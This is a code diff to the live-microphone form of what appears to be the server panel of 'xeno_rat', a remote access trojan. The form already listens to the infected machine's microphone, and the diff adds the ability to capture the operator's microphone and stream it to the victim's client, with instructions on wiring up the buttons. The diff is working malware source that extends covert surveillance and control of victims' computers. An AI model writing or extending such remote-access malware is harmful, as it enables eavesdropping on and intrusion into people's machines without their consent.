@@ -1,4 +1,5 @@
-﻿using System;
+﻿using NAudio.Wave;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -9,7 +10,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
-using NAudio.Wave;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar;
 
 namespace xeno_rat_server.Forms
 {
@@ -20,6 +21,10 @@ namespace xeno_rat_server.Forms
         AudioPlayer player = new AudioPlayer(new WaveFormat(44100, 16, 2));
         string[] MicroPhones;
         bool playing = false;
+
+        // New fields for server -> client audio (server microphone capture)
+        private WaveInEvent serverWaveIn;
+        private bool serverTalking = false;
 
         public Live_Microphone(Node _client)
         {
@@ -220,7 +225,6 @@ namespace xeno_rat_server.Forms
             player.Start();
             await client.SendAsync(new byte[] { 3 });
             playing = true;
-
         }
 
         /// <summary>
@@ -239,7 +243,6 @@ namespace xeno_rat_server.Forms
             player.Stop();
             await client.SendAsync(new byte[] { 4 });
             playing = false;
-
         }
 
         /// <summary>
@@ -252,6 +255,37 @@ namespace xeno_rat_server.Forms
         {
             await RefreshMics();
             //refresh
+        }   
+        
+        // -------------------------
+        // NEW: Server -> client talk controls
+        // Add two buttons in your Form Designer and wire them:
+        // - button4_Click = StartServerTalk (begin capturing server mic and sending to client)
+        // - button5_Click = StopServerTalk  (stop capturing)
+        // -------------------------
+
+        private void InitializeServerWaveInIfNeeded()
+        {
+            if (serverWaveIn != null) return;
+
+            serverWaveIn = new WaveInEvent();
+            serverWaveIn.DeviceNumber = 0; // or let user choose; default 0
+            serverWaveIn.WaveFormat = new WaveFormat(44100, 16, 2);
+            serverWaveIn.DataAvailable += async (s, a) =>
+            {
+                try
+                {
+                    if (serverTalking && MicNode != null && MicNode.Connected())
+                    {
+                        // send raw audio buffers to the client's MicNode
+                        await MicNode.SendAsync(a.Buffer);
+                    }
+                }
+                catch
+                {
+                    // ignore errors in send (client may have disconnected)
+                }
+            };
         }
 
         /// <summary>
@@ -281,6 +315,52 @@ namespace xeno_rat_server.Forms
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
             player.Dispose();
+            try
+            {
+                serverWaveIn?.StopRecording();
+                serverWaveIn?.Dispose();
+            }
+            catch { }
+            base.OnFormClosing(e);
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            // ensure MicNode is present
+            if (MicNode == null || !MicNode.Connected())
+            {
+                MessageBox.Show("No client MicNode available.");
+                return;
+            }
+
+            InitializeServerWaveInIfNeeded();
+            try
+            {
+                serverWaveIn.StartRecording();
+                serverTalking = true;
+
+                // Optionally update UI: enable/disable buttons
+                button4.Enabled = false;
+                button5.Enabled = true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Failed to start server mic: " + ex.Message);
+            }
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                serverTalking = false;
+                serverWaveIn?.StopRecording();
+
+                // Optionally update UI: enable/disable buttons
+                button4.Enabled = true;
+                button5.Enabled = false;
+            }
+            catch { }
         }
     }
     class AudioPlayer
